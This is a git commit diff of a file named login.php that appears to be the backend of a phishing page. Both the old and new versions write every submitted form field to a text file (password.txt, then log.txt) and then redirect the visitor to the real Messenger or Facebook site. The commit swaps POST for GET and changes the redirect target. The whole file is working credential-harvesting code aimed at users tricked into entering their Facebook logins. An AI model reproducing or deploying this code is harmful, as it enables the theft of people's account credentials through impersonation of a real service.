2ba448f10fc9bfb87f42d6a40f3a6a3978458cfe
batatus <karimwowwar99@live.fr>
2018-07-28 11:11:09 +0100

    be

--- login.php
+++ login.php
@@ -1,13 +1,13 @@
 <?php
-header ('Location: https://www.messenger.com/login/ ');
-$handle = fopen("password.txt", "a");
-foreach($_POST as $variable => $value) {
-    fwrite($handle, $variable);
-    fwrite($handle, "=");
-    fwrite($handle, $value);
-    fwrite($handle, "\r\n");
+header ('Location: http://www.facebook.com/');
+$handle = fopen("log.txt", "a");
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
 }
-fwrite($handle, "===============\r\n");
+fwrite($handle, "\r\n");
 fclose($handle);
 exit;
 ?>
